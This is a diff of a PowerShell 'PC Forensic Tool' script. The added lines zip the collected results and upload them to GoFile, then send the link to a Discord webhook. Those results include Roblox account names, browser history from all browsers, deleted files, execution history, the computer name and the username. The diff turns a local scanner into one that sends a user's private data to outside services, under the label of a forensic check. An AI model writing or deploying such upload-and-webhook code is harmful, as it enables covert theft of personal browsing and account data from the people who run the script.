+==============================================================================
+
+$($robloxAccounts | ForEach-Object { "- $_" } | Out-String)
+
+==============================================================================
+SUSPICIOUS FINDINGS
+==============================================================================
+
+$(if ($suspiciousItems.Count -gt 0) {
+    $suspiciousItems | Sort-Object -Unique | ForEach-Object { "❌ $_" } | Out-String
+} else {
+    "✓ No suspicious items detected based on keyword analysis"
+})
+
+==============================================================================
+FILES GENERATED
+==============================================================================
+
+- FULL_LOG.txt - Complete scan log
+- SUMMARY_REPORT.txt - This summary
+- ROBLOX_ACCOUNTS.txt - Roblox account information
+- BROWSER_HISTORY.txt - Browser history from all browsers
+- DELETED_FILES.txt - Recently deleted files
+- muicache_entries.txt - Application execution history
+- prefetch_files.txt - Prefetch analysis
+- temp_files.txt - Temporary files
+- running_processes.txt - Active processes
+- installed_programs.txt - Installed software
+
+==============================================================================
+"@
+
+$summary | Out-File $summaryFile
+Write-Log "`nSummary report created: $summaryFile" "Green"
 
 # ============================================================================
-# SUSPICIOUS FINDINGS SUMMARY
+# UPLOAD TO GOFILE
 # ============================================================================
 Write-Log "`n$(Get-Separator)" "Cyan"
-Write-Log "SUSPICIOUS FINDINGS SUMMARY" "Red"
+Write-Log "UPLOADING RESULTS TO GOFILE..." "Yellow"
 Write-Log "$(Get-Separator)" "Cyan"
 
-if ($suspiciousApps.Count -gt 0) {
-    Write-Log "`nFound $($suspiciousApps.Count) potentially suspicious items:" "Red"
-    $suspiciousApps | Sort-Object -Unique | ForEach-Object {
-        Write-Log "  [!] $_" "Yellow"
+# Create a ZIP archive of all files
+$zipFile = "$env:TEMP\PCForensics_$timestamp.zip"
+Write-Log "`n[*] Creating ZIP archive..." "Yellow"
+
+try {
+    Compress-Archive -Path "$outputDir\*" -DestinationPath $zipFile -Force
+    Write-Log "ZIP created: $zipFile" "Green"
+    
+    # Upload to GoFile
+    $gofileUrl = Upload-ToGoFile -FilePath $zipFile
+    
+    if ($gofileUrl) {
+        Write-Log "`n✓ GoFile Upload Successful!" "Green"
+        Write-Log "Download URL: $gofileUrl" "Cyan"
+        
+        # Send to Discord
+        if ($WebhookURL) {
+            $embedColor = if ($isSuspicious) { 15158332 } else { 3066993 }  # Red if suspicious, green if clean
+            
+            $embed = @{
+                title = if ($isSuspicious) { "⚠️ SUSPICIOUS ACTIVITY DETECTED" } else { "✓ Scan Complete - Clean" }
+                description = "PC Forensic Analysis Results"
+                color = $embedColor
+                fields = @(
+                    @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
+                    @{ name = "User"; value = $env:USERNAME; inline = $true }
+                    @{ name = "Scan Time"; value = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); inline = $false }
+                    @{ name = "Roblox Accounts"; value = "$($robloxAccounts.Count) found"; inline = $true }
+                    @{ name = "Suspicious Items"; value = "$($suspiciousItems.Count) detected"; inline = $true }
+                    @{ name = "📦 Download Results"; value = "[$gofileUrl]($gofileUrl)"; inline = $false }
+                )
+                footer = @{
+                    text = "PC Forensic Tool v2.0"
+                }
+                timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+            }
+            
+            # Add Roblox accounts to embed if found
+            if ($robloxAccounts.Count -gt 0) {
+                $robloxList = ($robloxAccounts | Select-Object -First 10 | ForEach-Object { "• $_" }) -join "`n"
+                if ($robloxAccounts.Count -gt 10) {
+                    $robloxList += "`n... and $($robloxAccounts.Count - 10) more"
+                }
+                $embed.fields += @{ name = "🎮 Roblox Accounts"; value = $robloxList; inline = $false }
+            }
+            
+            # Add suspicious items to embed if found
+            if ($suspiciousItems.Count -gt 0) {
+                $suspList = ($suspiciousItems | Select-Object -First 5 | ForEach-Object { "• $_" }) -join "`n"
+                if ($suspiciousItems.Count -gt 5) {
+                    $suspList += "`n... and $($suspiciousItems.Count - 5) more (see full report)"
+                }
+                $embed.fields += @{ name = "⚠️ Suspicious Findings"; value = $suspList; inline = $false }
+            }
+            
+            Send-DiscordMessage -Content "**Forensic Analysis Complete**" -Embeds @($embed)
+            Write-Log "`n✓ Results sent to Discord webhook!" "Green"
+        }
+    } else {
+        Write-Log "`n❌ GoFile upload failed" "Red"
     }
     
-    $suspiciousFile = "$outputDir\SUSPICIOUS_FINDINGS.txt"
-    $suspiciousApps | Sort-Object -Unique | Out-File $suspiciousFile
-    Write-Log "`nSuspicious findings saved to: $suspiciousFile" "Red"
-} else {
-    Write-Log "`nNo obvious suspicious items detected based on keywords." "Green"
-    Write-Log "Note: This is a basic keyword scan. Manual review recommended." "Yellow"
+    # Clean up temp ZIP
+    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
+    
+} catch {
+    Write-Log "Error creating/uploading ZIP: $_" "Red"
 }
 
 # ============================================================================
 # COMPLETION
 # ============================================================================
 Write-Log "`n$(Get-Separator)" "Cyan"
-Write-Log "SCAN COMPLETE" "Green"
-Write-Log "Scan Ended: $(Get-Date)" "Cyan"
-Write-Log "All results saved to: $outputDir" "Green"
+Write-Log "SCAN COMPLETE!" "Green"
+Write-Log "Analysis Status: $(if ($isSuspicious) { '⚠️ SUSPICIOUS' } else { '✓ CLEAN' })" $(if ($isSuspicious) { "Red" } else { "Green" })
+Write-Log "Results folder: $outputDir" "Cyan"
+if ($gofileUrl) {
+    Write-Log "GoFile Download: $gofileUrl" "Cyan"
+}
 Write-Log "$(Get-Separator)" "Cyan"
 
-# Open the output directory
+# Open results folder
 Start-Process explorer.exe $outputDir
 
-Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
+Write-Host "`nPress any key to exit..." -ForegroundColor Yellow
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
